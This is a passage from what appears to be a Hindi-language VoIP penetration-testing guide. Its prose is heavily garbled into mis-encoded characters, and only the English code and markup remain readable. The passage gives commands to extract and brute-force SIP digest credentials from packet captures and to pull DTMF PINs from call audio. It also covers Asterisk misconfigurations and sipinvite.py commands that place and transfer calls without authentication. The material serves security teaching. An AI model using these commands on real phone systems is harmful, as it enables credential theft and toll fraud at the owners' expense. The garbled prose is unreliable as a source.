рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ **SIP рд╕рдВрдЪрд╛рд░ рдореЗрдВ TLS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**, рддреЛ рдЖрдк рд╕рд╛рдл рджреЗрдЦ рдирд╣реАрдВ рдкрд╛рдПрдВрдЧреЗред\
рдпрджрд┐ **SRTP** рдФрд░ **ZRTP** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ **RTP рдкреИрдХреЗрдЯ рд╕рд╛рдл рдкрд╛рда** рдореЗрдВ рдирд╣реАрдВ рд╣реЛрдВрдЧреЗред
{% endhint %}

#### SIP рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓

[рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдЖрдк рдПрдХ **SIP REGISTER рд╕рдВрдЪрд╛рд░** рдХреЛ рдмреЗрд╣рддрд░ рд╕рдордЭ рд╕рдХреЗрдВ](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) рдФрд░ рд╕реАрдЦреЗрдВ рдХрд┐ **рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреИрд╕реЗ рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ**ред

* **`sipdump`** рдФрд░ **`sipcrack`,** **sipcrack** рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ (`apt-get install sipcrack`): рдпреЗ рдЙрдкрдХрд░рдг SIP рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рднреАрддрд░ рд╕реЗ **рдбрд╛рдЗрдЬреЗрд╕реНрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХреЛ **рдкреНрд░рд╛рдкреНрдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ **рдмреНрд░реВрдЯрдлреЛрд░реНрд╕** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`siptshar.py`, `sipdump.py`, `sipcrack.py`** рдпрд╣рд╛рдВ рд╕реЗ рдЖрдП рд╣реИрдВ [**sippts**](https://github.com/Pepelux/sippts)**:**
* **SipTshark** рдПрдХ PCAP рдлрд╝рд╛рдЗрд▓ рд╕реЗ SIP рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рдбреЗрдЯрд╛ рдХреЛ рдирд┐рдХрд╛рд▓рддрд╛ рд╣реИред
* **SipDump** рдПрдХ PCAP рдлрд╝рд╛рдЗрд▓ рд╕реЗ SIP Digest рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдирд┐рдХрд╛рд▓рддрд╛ рд╣реИред
* **SIP Digest Crack** SIP рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рднреАрддрд░ Digest рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдХреНрд░реИрдХ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдЙрдкрдХрд░рдг рд╣реИред
```bash
python3 siptshark.py -f captura3.pcap [-filter auth]
python3 sipdump.py -f captura3.pcap -o data.txt
python3 sipcrack.py -f data.txt -w wordlist/rockyou.txt
```
#### DTMF рдХреЛрдб

**рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд┐рдХ рдореЗрдВ** SIP рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЗ рдЕрд▓рд╛рд╡рд╛, DTMF рдХреЛрдб рднреА рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **рд╡реЙрдЗрд╕рдореЗрд▓** рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред\
рдпреЗ рдХреЛрдб **INFO SIP рд╕рдВрджреЗрд╢реЛрдВ**, **рдСрдбрд┐рдпреЛ** рдпрд╛ **RTP рдкреИрдХреЗрдЯреНрд╕** рдореЗрдВ рднреЗрдЬреЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдХреЛрдб RTP рдкреИрдХреЗрдЯреНрд╕ рдореЗрдВ рд╣реИрдВ, рддреЛ рдЖрдк рдЙрд╕ рдмрд╛рддрдЪреАрдд рдХрд╛ рдЙрд╕ рд╣рд┐рд╕реНрд╕рд╛ рдХрд╛рдЯ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ multimo рдЯреВрд▓ рдХреЛ рдЙрдиреНрд╣реЗрдВ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП:
```bash
multimon -a DTMF -t wac pin.wav
```
### рдореБрдлреНрдд рдХреЙрд▓ / рдПрд╕реНрдЯреЗрд░рд┐рд╕реНрдХ рдХрдиреЗрдХреНрд╢рди рдорд┐рд╕рдХреЙрдиреНрдлрд┐рдЧрд░реЗрд╢рди

рдПрд╕реНрдЯреЗрд░рд┐рд╕реНрдХ рдореЗрдВ рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЖрдИрдкреА рдкрддреЗ рд╕реЗ рдХрдиреЗрдХреНрд╢рди рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдирд╛ рд╕рдВрднрд╡ рд╣реИ рдпрд╛ рдХрд┐рд╕реА рднреА рдЖрдИрдкреА рдкрддреЗ рд╕реЗ:
```
host=10.10.10.10
host=dynamic
```
рдпрджрд┐ рдПрдХ рдЖрдИрдкреА рдкрддрд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╣реЛрд╕реНрдЯ рдХреЛ рд╕рдордп-рд╕рдордп рдкрд░ REGISTER рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрдЧреА (REGISTER рдкреИрдХреЗрдЯ рдореЗрдВ рдЯрд╛рдЗрдо рдЯреВ рд▓рд┐рд╡, рдЖрдорддреМрд░ рдкрд░ 30 рдорд┐рдирдЯ рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рджреВрд╕рд░реЗ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдлрд╝реЛрди рдХреЛ рд╣рд░ 30 рдорд┐рдирдЯ рдореЗрдВ REGISTER рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА)ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕рдХреЗ рд▓рд┐рдП рдЦреБрд▓реЗ рдкреЛрд░реНрдЯ рд╣реЛрдиреЗ рдЪрд╛рд╣рд┐рдП рдЬреЛ рд╡реЙрдпрдк рд╕рд░реНрд╡рд░ рд╕реЗ рдХрдиреЗрдХреНрд╢рди рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред

рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдврдВрдЧ рд╕реЗ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

* **`type=user`**: рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗрд╡рд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред
* **`type=friend`**: рдкреАрдпрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрд▓ рдХрд░рдиреЗ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛрддреА рд╣реИ (рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ)
* **`type=peer`**: рдкреАрдпрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрд▓ рднреЗрдЬрдиреЗ рдФрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛрддреА рд╣реИ (SIP-рдЯреНрд░рдВрдХ)

рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдЪрд░ рдХреЗ рд╕рд╛рде рд╡рд┐рд╢реНрд╡рд╛рд╕ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИ:

* **`insecure=port`**: рдЖрдИрдкреА рджреНрд╡рд╛рд░рд╛ рд╕рддреНрдпрд╛рдкрд┐рдд рдкреАрдпрд░ рдХрдиреЗрдХреНрд╢рди рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
* **`insecure=invite`**: INVITE рд╕рдВрджреЗрд╢реЛрдВ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ
* **`insecure=port,invite`**: рджреЛрдиреЛрдВ

{% hint style="warning" %}
рдЬрдм **`type=friend`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ **host** рдЪрд░ рдХрд╛ **рдорд╛рди** рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рд╣реЛрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдПрдХ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЙрд╕ рдорд╛рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ SIP-рдЯреНрд░рдВрдХ рдХреЛ рдЧрд▓рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рддрд╛ рд╣реИ, рддреЛ **рдХреЛрдИ рднреА рдЙрд╕рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛ рд╕рдХреЗрдЧрд╛**ред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрд╣ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕рдВрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рд╣реЛрдЧреА:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### рдореБрдлреНрдд рдХреЙрд▓ / рдПрд╕реНрдЯреЗрд░рд┐рд╕реНрдХ рдХрдВрдЯреЗрдХреНрд╕реНрдЯ рдорд┐рд╕рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди

рдПрд╕реНрдЯреЗрд░рд┐рд╕реНрдХ рдореЗрдВ **рдХрдВрдЯреЗрдХреНрд╕реНрдЯ** рдПрдХ рдирд╛рдорд┐рдд рдХрдВрдЯреЗрдирд░ рдпрд╛ рдзрд╛рд░рд╛ рд╣реЛрддреА рд╣реИ рдЬреЛ рдбрд╛рдпрд▓ рдкреНрд▓рд╛рди рдореЗрдВ рд╕рдВрдмрдВрдзрд┐рдд рдПрдХреНрд╕рдЯреЗрдВрд╢рди, рдХрд╛рд░реНрд░рд╡рд╛рдИ рдФрд░ рдирд┐рдпрдореЛрдВ рдХреЛ **рд╕рдореВрд╣реАрдХреГрдд рдХрд░рддреА рд╣реИ**ред рдбрд╛рдпрд▓ рдкреНрд▓рд╛рди рдПрдХ рдПрд╕реНрдЯреЗрд░рд┐рд╕реНрдХ рд╕рд┐рд╕реНрдЯрдо рдХрд╛ рдореВрд▓ рдШрдЯрдХ рд╣реЛрддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ **рдЖрдЙрдЯрдЧреЛрдЗрдВрдЧ рдФрд░ рдЗрдирдХрдорд┐рдВрдЧ рдХреЙрд▓ рдХреЛ рдХреИрд╕реЗ рд╣реИрдВрдбрд▓ рдФрд░ рд░реВрдЯ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ** рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред рдХрдВрдЯреЗрдХреНрд╕реНрдЯ рдХреЛ рдбрд╛рдпрд▓ рдкреНрд▓рд╛рди рдХреЛ рд╡реНрдпрд╡рд╕реНрдерд┐рдд рдХрд░рдиреЗ, рдкрд╣реБрдВрдЪ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдФрд░ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд╡рд┐рднрд┐рдиреНрди рд╣рд┐рд╕реНрд╕реЛрдВ рдХреЗ рдмреАрдЪ рдЕрд▓рдЧрд╛рд╡ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдкреНрд░рддреНрдпреЗрдХ рдХрдВрдЯреЗрдХреНрд╕реНрдЯ рдХреЛ рд╕рд╛рдорд╛рдиреНрдпрддрдГ **`extensions.conf`** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдХрдВрдЯреЗрдХреНрд╕реНрдЯ рдХреЛ рд╡рд░реНрдЧрд╛рдХрд╛рд░ рдмреНрд░реИрдХреЗрдЯреНрд╕ рджреНрд╡рд╛рд░рд╛ рджрд░реНрд╢рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рдирдореЗрдВ рдХрдВрдЯреЗрдХреНрд╕реНрдЯ рдХрд╛ рдирд╛рдо рд╕рдорд╛рд╡реЗрд╢рд┐рдд рд╣реЛрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```bash
csharpCopy code[my_context]
```
рдЗрд╕ рд╕рдВрджрд░реНрдн рдореЗрдВ, рдЖрдк рдПрдХреНрд╕рдЯреЗрдВрд╢рдиреНрд╕ (рдбрд╛рдпрд▓ рдХрд┐рдП рдЧрдП рдирдВрдмрд░реЛрдВ рдХреЗ рдкреИрдЯрд░реНрди) рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдХрд╛рд░реНрд░рд╡рд╛рдИрдпреЛрдВ рдпрд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝рддреЗ рд╣реИрдВред рдпреЗ рдХрд╛рд░реНрд░рд╡рд╛рдИрдпрд╛рдБ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддреА рд╣реИрдВ рдХрд┐ рдХреЙрд▓ рдХреИрд╕реЗ рдкреНрд░реЛрд╕реЗрд╕ рд╣реЛрддреА рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
рдпрд╣ рдЙрджрд╛рд╣рд░рдг "my\_context" рдирд╛рдордХ рдПрдХ рд╕рд░рд▓ рд╕рдВрджрд░реНрдн рдХреЛ рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ "100" рдирд╛рдордХ рдПрдХ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд╣реЛрддрд╛ рд╣реИред рдЬрдм рдХреЛрдИ рд╡реНрдпрдХреНрддрд┐ 100 рдбрд╛рдпрд▓ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдХреЙрд▓ рдХреЛ рдЙрдард╛рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдПрдХ рд╕реНрд╡рд╛рдЧрдд рд╕рдВрджреЗрд╢ рдкреНрд▓реЗ рд╣реЛрдЧрд╛, рдФрд░ рдлрд┐рд░ рдХреЙрд▓ рд╕рдорд╛рдкреНрдд рд╣реЛ рдЬрд╛рдПрдЧреАред

рдпрд╣ **рдПрдХ рдФрд░ рд╕рдВрджрд░реНрдн** рд╣реИ рдЬреЛ **рдХрд┐рд╕реА рдЕрдиреНрдп рдирдВрдмрд░ рдкрд░ рдХреЙрд▓ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
рдпрджрд┐ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рдВрджрд░реНрдн** рдХреЛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
рдХреЛрдИ рднреА рд╡реНрдпрдХреНрддрд┐ **рд╕рд░реНрд╡рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рд╕реА рднреА рдЕрдиреНрдп рдирдВрдмрд░ рдкрд░ рдХреЙрд▓ рдХрд░ рд╕рдХреЗрдЧрд╛** (рдФрд░ рд╕рд░реНрд╡рд░ рдХреЗ рдкреНрд░рд╢рд╛рд╕рдХ рдХреЛ рдХреЙрд▓ рдХреЗ рд▓рд┐рдП рднреБрдЧрддрд╛рди рдХрд░рдирд╛ рд╣реЛрдЧрд╛)ред
{% endhint %}

{% hint style="danger" %}
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ **`sip.conf`** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **`allowguest=true`** рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП **рдХреЛрдИ рднреА** рд╣рдорд▓рд╛рд╡рд░ **рдХреЛрдИ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдирд╣реАрдВ** рдХреЗ рд╕рд╛рде рдХрд┐рд╕реА рднреА рдЕрдиреНрдп рдирдВрдмрд░ рдкрд░ рдХреЙрд▓ рдХрд░ рд╕рдХреЗрдЧрд╛ред
{% endhint %}

*   **`sipinvite.py`** from [**sippts**](https://github.com/Pepelux/sippts)**:** Sipinvite рдпрд╣ рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдПрдХ **PBX рд╕рд░реНрд╡рд░ рд╣рдореЗрдВ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рдмрд┐рдирд╛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ**ред рдпрджрд┐ SIP рд╕рд░реНрд╡рд░ рдореЗрдВ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╣реИ, рддреЛ рдпрд╣ рд╣рдореЗрдВ рдмрд╛рд╣рд░реА рдирдВрдмрд░реЛрдВ рдкрд░ рдХреЙрд▓ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред рдпрд╣ рд╣рдореЗрдВ рдХреЙрд▓ рдХреЛ рджреВрд╕рд░реЗ рдмрд╛рд╣рд░реА рдирдВрдмрд░ рдкрд░ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рдиреЗ рдХреА рднреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдЖрдкрдХреЗ Asterisk рд╕рд░реНрд╡рд░ рдореЗрдВ рдПрдХ рдмреБрд░реА рд╕рдВрджрд░реНрдн рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╣реИ, рддреЛ рдЖрдк INVITE рдЕрдиреБрд░реЛрдз рдХреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рдмрд┐рдирд╛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛/рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдЬрд╛рдирдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ рдФрд░ рд╡рд╣ рдХреЙрд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
python3 sipinvite.py -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
python3 sipinvite.py -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### рдореБрдлреНрдд рдХреЙрд▓ / рдЧрд▓рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ IVRS

IVRS рдХрд╛ рдорддрд▓рдм рд╣реЛрддрд╛ рд╣реИ **рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ рд╡реЙрдпрд╕ рд░рд┐рд╕реНрдкреЙрдиреНрд╕ рд╕рд┐рд╕реНрдЯрдо**, рдПрдХ рдЯреЗрд▓реАрдлреЛрдиреА рддрдХрдиреАрдХ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЖрд╡рд╛рдЬ рдпрд╛ рдЯрдЪ-рдЯреЛрди рдЗрдирдкреБрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрдВрдкреНрдпреВрдЯрд░реАрдХреГрдд рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред IVRS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХреЙрд▓ рд╣реИрдВрдбрд▓рд┐рдВрдЧ** рд╕рд┐рд╕реНрдЯрдо рдмрдирд╛рдП рдЬрд╛рддреЗ рд╣реИрдВ рдЬреЛ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рджрд╛рди рдХрд░рдиреЗ, рдХреЙрд▓ рд░реВрдЯ рдХрд░рдиреЗ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдЬреИрд╕реЗ рдХрдИ рдлрд╝рдВрдХреНрд╢рдирд▓рд┐рдЯреАрдЬрд╝ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВред

VoIP рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ IVRS рдЖрдорддреМрд░ рдкрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реЗ рдорд┐рд▓рддрд╛ рд╣реИ:

1. **рд╡реЙрдпрд╕ рдкреНрд░реЙрдореНрдкреНрдЯреНрд╕**: IVR рдореЗрдиреВ рд╡рд┐рдХрд▓реНрдкреЛрдВ рдФрд░ рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдкреВрд░реНрд╡-рд░рд┐рдХреЙрд░реНрдбреЗрдб рдСрдбрд┐рдпреЛ рд╕рдВрджреЗрд╢ред
2. **DTMF** (рдбреНрдпреВрд▓-рдЯреЛрди рдорд▓реНрдЯреА-рдлрд╝реНрд░реАрдХреНрд╡реЗрдВрд╕реА) рд╕рд┐рдЧреНрдирд▓рд┐рдВрдЧ: рдлрд╝реЛрди рдкрд░ рдХреБрдВрдЬреА рджрдмрд╛рдХрд░ рдЙрддреНрдкрдиреНрди рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдЯрдЪ-рдЯреЛрди рдЗрдирдкреБрдЯ, рдЬрд┐рдиреНрд╣реЗрдВ IVR рдореЗрдиреВ рдореЗрдВ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░рдиреЗ рдФрд░ рдЗрдирдкреБрдЯ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
3. **рдХреЙрд▓ рд░реВрдЯрд┐рдВрдЧ**: рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╡рд┐рд╢реЗрд╖ рд╡рд┐рднрд╛рдЧреЛрдВ, рдПрдЬреЗрдВрдЯреЛрдВ рдпрд╛ рдПрдХреНрд╕рдЯреЗрдВрд╢рдиреНрд╕ рдЬреИрд╕реЗ рдЙрдЪрд┐рдд рдЧрдВрддрд╡реНрдп рдХреЛ рдХреЙрд▓ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдирд╛ред
4. **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХреИрдкреНрдЪрд░**: рдЦрд╛рддрд╛ рдирдВрдмрд░, рдорд╛рдорд▓рд╛ рдЖрдИрдбреА рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ рдбреЗрдЯрд╛ рдЬреИрд╕реЗ рдХреЙрд▓рд░ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдПрдХрддреНрд░ рдХрд░рдирд╛ред
5. **рдмрд╛рд╣рд░реА рд╕рд┐рд╕реНрдЯрдореЛрдВ рдХреЗ рд╕рд╛рде рдПрдХреАрдХрд░рдг**: IVR рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдбреЗрдЯрд╛рдмреЗрд╕ рдпрд╛ рдЕрдиреНрдп рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рд╕рд┐рд╕реНрдЯрдо рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдирд╛ рддрд╛рдХрд┐ рдЬрд╛рдирдХрд╛рд░реА рдПрдХреНрд╕реЗрд╕ рдпрд╛ рдЕрдкрдбреЗрдЯ рдХрд░рдиреЗ, рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░рдиреЗ рдпрд╛ рдШрдЯрдирд╛рдУрдВ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

рдПрдХ Asterisk VoIP рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ, рдЖрдк рдбрд╛рдпрд▓ рдкреНрд▓рд╛рди (**`extensions.conf`** рдлрд╝рд╛рдЗрд▓) рдФрд░ `Background()`, `Playback()`, `Read()` рдФрд░ рдЕрдиреНрдп рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ IVR рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрди рдРрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдХреА рдорджрдж рд╕реЗ рдЖрдк рд╡реЙрдпрд╕ рдкреНрд░реЙрдореНрдкреНрдЯреНрд╕ рдкреНрд▓реЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ 